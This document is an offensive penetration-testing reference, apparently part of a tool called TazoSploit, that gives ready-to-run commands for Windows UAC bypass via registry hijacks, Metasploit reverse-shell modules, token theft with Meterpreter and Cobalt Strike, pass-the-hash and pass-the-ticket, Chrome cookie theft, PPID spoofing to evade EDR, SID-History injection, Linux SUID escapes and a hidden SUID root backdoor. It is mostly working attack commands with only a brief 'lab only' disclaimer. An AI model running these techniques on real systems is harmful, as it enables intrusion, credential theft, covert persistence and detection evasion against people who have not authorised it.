# Token Manipulation, UAC Bypass & Elevation Evasion
## TazoSploit Defense Evasion Reference

> **Purpose:** Post-exploitation elevation and token abuse techniques for bypassing access controls.
> **MITRE Tactics:** Defense Evasion (TA0005), Privilege Escalation (TA0004)
> **Last Updated:** 2026-02-11

---

## ⚠️ Safety Notes (Read First)
- **Token impersonation risk:** Impersonating the wrong token (e.g., ANONYMOUS LOGON) can lock you out of your current session. Always note your current token before switching.
- **Revert command:** Meterpreter `rev2self` — restores your original token. Memorize this.
- **UAC bypass artifacts:** Registry keys written for fodhelper/eventvwr persist after execution — clean `HKCU\Software\Classes\ms-settings` and `HKCU\Software\Classes\mscfile`.
- **Pass-the-Hash detection:** Modern EDRs flag NTLM auth from unusual sources. Use sparingly, prefer Kerberos when possible.
- **Lab only:** All techniques below are for authorized penetration testing in controlled environments.

---

## T1548 — Abuse Elevation Control Mechanism

### T1548.002 — UAC Bypass (Windows)

UAC (User Account Control) can be bypassed when the user is in the local Administrators group but running a medium-integrity process. These techniques auto-elevate without prompting.

**Prerequisites:** User must be in local Administrators group. UAC set to "Notify me only when apps try to make changes" (default).

#### fodhelper.exe Method (Most Reliable)
```cmd
# Set the command to execute when fodhelper auto-elevates
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /d "cmd.exe /c <PAYLOAD>" /f
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v DelegateExecute /t REG_SZ /f

# Trigger — fodhelper.exe is auto-elevate, reads ms-settings
fodhelper.exe

# Cleanup (MANDATORY)
reg delete "HKCU\Software\Classes\ms-settings" /f
```

#### eventvwr.exe Method
```cmd
# eventvwr.exe checks HKCU\Software\Classes\mscfile\shell\open\command before HKCR
reg add "HKCU\Software\Classes\mscfile\shell\open\command" /d "cmd.exe /c <PAYLOAD>" /f
eventvwr.exe

# Cleanup
reg delete "HKCU\Software\Classes\mscfile" /f
```

#### computerdefaults.exe Method
```cmd
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /d "<PAYLOAD>" /f
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v DelegateExecute /t REG_SZ /f
computerdefaults.exe
reg delete "HKCU\Software\Classes\ms-settings" /f
```

#### sdclt.exe Method (Windows 10)
```cmd
reg add "HKCU\Software\Classes\Folder\shell\open\command" /d "<PAYLOAD>" /f
reg add "HKCU\Software\Classes\Folder\shell\open\command" /v DelegateExecute /t REG_SZ /f
sdclt.exe
reg delete "HKCU\Software\Classes\Folder" /f
```

#### Metasploit UAC Bypass Modules (Top 5)
```ruby
# 1. fodhelper — most reliable on Win10/11
use exploit/windows/local/bypassuac_fodhelper
set SESSION <id>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <ip>
run

# 2. eventvwr — works on Win7/8/10
use exploit/windows/local/bypassuac_eventvwr
set SESSION <id>
run

# 3. comhijack — COM object hijacking UAC bypass
use exploit/windows/local/bypassuac_comhijack
set SESSION <id>
run

# 4. silentcleanup — abuses scheduled task that runs elevated
use exploit/windows/local/bypassuac_silentcleanup
set SESSION <id>
run

# 5. dotnet_profiler — COR_PROFILER environment variable abuse
use exploit/windows/local/bypassuac_dotnet_profiler
set SESSION <id>
run
```

### T1548.001 — Setuid and Setgid Abuse (Linux)

SUID binaries run with the file owner's privileges — if owned by root, they execute as root.

```bash
# Find all SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Find all SGID binaries
find / -perm -2000 -type f 2>/dev/null

# Combined search
find / -perm -u=s -o -perm -g=s -type f 2>/dev/null

# Common exploitable SUID binaries (check GTFOBins: https://gtfobins.github.io/)
# nmap (interactive mode, older versions)
nmap --interactive
!sh

# find
find . -exec /bin/sh -p \;

# vim
vim -c ':!/bin/sh'

# python
python -c 'import os; os.execl("/bin/sh","sh","-p")'

# bash (if SUID)
bash -p

# env
env /bin/sh -p
```

#### Creating a Custom SUID Binary (Persistence)
```c
// suid_shell.c — compile and set SUID for backdoor root access
#include <unistd.h>
int main() {
    setuid(0); setgid(0);
    execl("/bin/bash", "bash", "-p", NULL);
}
```
```bash
gcc suid_shell.c -o /tmp/.hidden_shell
chown root:root /tmp/.hidden_shell
chmod 4755 /tmp/.hidden_shell
```

### T1548.003 — Sudo Caching Abuse (Linux)

```bash
# Check what you can run as sudo
sudo -l

# If timestamp_timeout > 0 (default 5-15 min), sudo caches credentials
# After user runs any sudo command, you can piggyback:
sudo su -

# Check sudoers misconfigs
cat /etc/sudoers 2>/dev/null
# Look for: NOPASSWD entries, wildcard abuse, writable scripts

# Common dangerous sudoers entries:
# user ALL=(ALL) NOPASSWD: /usr/bin/vim   → vim -c ':!/bin/bash'
# user ALL=(ALL) NOPASSWD: /usr/bin/find  → find / -exec /bin/sh \;
# user ALL=(ALL) NOPASSWD: /usr/bin/env   → env /bin/bash

# Clear sudo cache (defensive / cover tracks)
sudo -k
```

---

## T1134 — Access Token Manipulation (Windows)

### T1134.001 — Token Impersonation/Theft

Every Windows process runs with an access token. Steal a token from a higher-privileged process to escalate.

#### Meterpreter Token Theft
```ruby
# Direct token steal from a PID
meterpreter > ps                        # List processes, find SYSTEM or Domain Admin
meterpreter > steal_token <PID>         # Steal token from target PID
meterpreter > getuid                    # Verify new identity
meterpreter > rev2self                  # ⚠️ REVERT — always have this ready

# Incognito module (more control)
meterpreter > load incognito
meterpreter > list_tokens -u            # List available delegation tokens by user
meterpreter > list_tokens -g            # List by group
meterpreter > impersonate_token "DOMAIN\\Administrator"
meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"

# Hunting for specific tokens
meterpreter > list_tokens -u | grep -i admin
```

#### Cobalt Strike Token Manipulation
```
beacon> steal_token <PID>               # Steal token from process
beacon> getuid                          # Verify
beacon> make_token DOMAIN\user password # Create token with known creds
beacon> rev2self                        # Revert
```

### T1134.002 — Create Process with Token

```cmd
# runas — create process as another user (requires password)
runas /user:DOMAIN\admin cmd.exe
runas /user:admin /savecred cmd.exe     # Uses saved Windows credentials
runas /netonly /user:DOMAIN\admin cmd.exe  # Network auth only (no local profile)
```
**API-level:** `CreateProcessWithTokenW` / `CreateProcessAsUserW` — used by C2 frameworks to spawn processes under stolen tokens. Requires `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`.

### T1134.004 — Parent PID Spoofing

EDR/SIEM detect anomalies via parent-child process relationships (e.g., Word spawning PowerShell = suspicious). PPID spoofing makes your process appear to be spawned by a legitimate parent like `svchost.exe`.

**Why it matters:** If your payload spawns `cmd.exe` from `excel.exe`, EDR flags it. If it appears spawned by `svchost.exe` (PID you specify), it blends in.

```powershell
# PowerShell concept using STARTUPINFOEX
$si = New-Object STARTUPINFOEX
$si.lpAttributeList  # Set PROC_THREAD_ATTRIBUTE_PARENT_PROCESS to target PID
# CreateProcess with EXTENDED_STARTUPINFO_PRESENT flag
```

**Cobalt Strike:**
```
beacon> ppid <PID>            # Set parent PID for subsequent post-ex jobs
beacon> ppid 0                # Reset to default
beacon> spawnto x64 %windir%\sysnative\svchost.exe  # Spoof spawn target
```

**Detection:** EDR can still catch this via ETW (Event Tracing for Windows) — the real parent PID is logged in kernel callbacks. Advanced EDR correlates both.

### T1134.005 — SID-History Injection

Inject a privileged SID (e.g., Domain Admins) into a user's SID-History attribute. The user then inherits those privileges across the domain — **powerful persistence**.

```
# Mimikatz — add Domain Admins SID to user's SID-History
mimikatz # sid::patch
mimikatz # sid::add /sam:targetuser /new:S-1-5-21-<domain>-512

# Requires Domain Admin or DC access
# S-1-5-21-<domain>-512 = Domain Admins RID
# S-1-5-21-<domain>-519 = Enterprise Admins RID

# Detection: Monitor Event ID 4765 (SID History added) and 4766 (SID History add failed)
```

---

## T1550 — Use Alternate Authentication Material

### T1550.002 — Pass-the-Hash (PtH)

Authenticate using NTLM hash without knowing the plaintext password.

```bash
# pth-winexe (Linux → Windows)
pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4' //10.10.10.5 cmd.exe

# Mimikatz (Windows → Windows)
mimikatz # sekurlsa::pth /user:admin /domain:CORP /ntlm:32ed87bdb5fdc5e9cba88547376818d4 /run:cmd.exe

# CrackMapExec (Swiss army knife)
cme smb 10.10.10.5 -u admin -H 32ed87bdb5fdc5e9cba88547376818d4
cme smb 10.10.10.0/24 -u admin -H 32ed87bdb5fdc5e9cba88547376818d4 --shares   # Enumerate shares
cme smb 10.10.10.0/24 -u admin -H HASH -x "whoami"                             # Command exec

# evil-winrm (WinRM access with hash)
evil-winrm -i 10.10.10.5 -u admin -H 32ed87bdb5fdc5e9cba88547376818d4

# Impacket suite
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4 admin@10.10.10.5
wmiexec.py -hashes :32ed87bdb5fdc5e9cba88547376818d4 admin@10.10.10.5
smbexec.py -hashes :32ed87bdb5fdc5e9cba88547376818d4 admin@10.10.10.5
```

### T1550.003 — Pass-the-Ticket (PtT)

Use stolen Kerberos tickets (TGT/TGS) to authenticate without password or hash.

```bash
# Mimikatz — export and inject tickets
mimikatz # sekurlsa::tickets /export       # Dump all tickets from memory
mimikatz # kerberos::ptt ticket.kirbi      # Inject ticket into session

# Rubeus (C# — runs on target)
Rubeus.exe dump /nowrap                     # Dump tickets (base64)
Rubeus.exe ptt /ticket:<base64_ticket>      # Inject ticket
Rubeus.exe asktgt /user:admin /rc4:HASH     # Request TGT with hash

# Impacket (Linux)
export KRB5CCNAME=/path/to/ticket.ccache
psexec.py -k -no-pass CORP/admin@dc01.corp.local
getTGT.py -hashes :HASH CORP/admin          # Request TGT → saves .ccache
```

### T1550.004 — Web Session Cookie Theft

Steal session cookies/tokens to hijack authenticated web sessions — bypasses MFA entirely.

```bash
# Browser cookie extraction (post-compromise)
# Chrome cookies (Windows): %LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies
# Chrome cookies (Linux): ~/.config/google-chrome/Default/Cookies
# Encrypted with DPAPI (Windows) or v10/v11 key (Linux)

# Mimikatz DPAPI cookie decryption
mimikatz # dpapi::chrome /in:"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies"

# SharpChrome (C#)
SharpChrome.exe cookies /browser:chrome /format:json

# Use with: Browser dev tools, Burp Suite, or curl
curl -H "Cookie: session=<stolen_token>" https://target.com/admin
```

---

## T1222 — File and Directory Permissions Modification

### T1222.002 — Linux/Mac

```bash
chmod 777 /etc/shadow              # World-readable (obvious, noisy)
chmod u+s /tmp/backdoor            # Set SUID bit
chown root:root /tmp/backdoor      # Change ownership to root
chattr -i /etc/important.conf      # Remove immutable flag (allows modification)
chattr +i /tmp/backdoor            # Make YOUR file immutable (persistence)
setfacl -m u:attacker:rwx /target  # ACL-based permission grant (stealthier than chmod)
getfacl /target                    # Verify ACLs
```

### T1222.001 — Windows

```cmd
:: Grant Everyone full control
icacls "C:\target\file.exe" /grant Everyone:F

:: Take ownership (needed before modifying protected files)
takeown /f "C:\Windows\System32\target.dll"
icacls "C:\Windows\System32\target.dll" /grant Administrators:F

:: Hide file + set system attribute
attrib +h +s "C:\tools\payload.exe"

:: Remove hidden/system (cleanup)
attrib -h -s "C:\tools\payload.exe"

:: PowerShell ACL manipulation
$acl = Get-Acl "C:\target"
$rule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone","FullControl","Allow")
$acl.SetAccessRule($rule)
Set-Acl "C:\target" $acl
```

---

## Decision Tree: When to Use Which Technique

```
Need elevated access on Windows?
├── In local Admins group but medium integrity?
│   └── UAC Bypass (T1548.002) → fodhelper first, then eventvwr
├── Have another user's NTLM hash?
│   ├── SMB/WinRM available? → Pass-the-Hash (T1550.002)
│   └── Kerberos only? → Request TGT → Pass-the-Ticket (T1550.003)
├── Have a Meterpreter session?
│   ├── See SYSTEM process? → steal_token <PID> (T1134.001)
│   └── Need specific user? → load incognito → impersonate_token (T1134.001)
├── Need to blend with normal processes?
│   └── Parent PID Spoofing (T1134.004)
└── Need persistent domain access?
    ├── SID-History Injection (T1134.005) — survives password changes
    └── Golden/Silver Ticket (T1558) — see kerberoasting reference

Need elevated access on Linux?
├── SUID binary available?
│   └── Check GTFOBins → exploit SUID (T1548.001)
├── sudo configured?
│   ├── NOPASSWD entry? → direct sudo abuse (T1548.003)
│   └── Recent sudo auth? → piggyback cached credentials (T1548.003)
└── Need persistence?
    └── Create custom SUID binary (T1548.001)
```

---

## Quick Reference Card

| Technique | Command | Use When |
|-----------|---------|----------|
| UAC Bypass (fodhelper) | `reg add ... + fodhelper.exe` | Local admin, need high integrity |
| Token Steal | `steal_token <PID>` | Meterpreter, see privileged process |
| Incognito | `load incognito` → `impersonate_token` | Need specific domain user token |
| Pass-the-Hash | `cme smb target -u admin -H HASH` | Have NTLM hash, need remote access |
| Pass-the-Ticket | `export KRB5CCNAME=ticket.ccache` | Have Kerberos ticket |
| SUID Abuse | `find / -perm -4000` → GTFOBins | Linux, found SUID binary |
| Sudo Abuse | `sudo -l` → exploit NOPASSWD | Linux, sudo misconfigured |
| PPID Spoof | `beacon> ppid <PID>` | Evading parent-child detection |
| SID-History | `mimikatz sid::add` | AD persistence, have DC access |

---

*Cross-references: [log_clearing.md](log_clearing.md) | [process_injection.md](process_injection.md) | [defense_controls.md](defense_controls.md)*
*GTFOBins: https://gtfobins.github.io/ | LOLBAS: https://lolbas-project.github.io/*
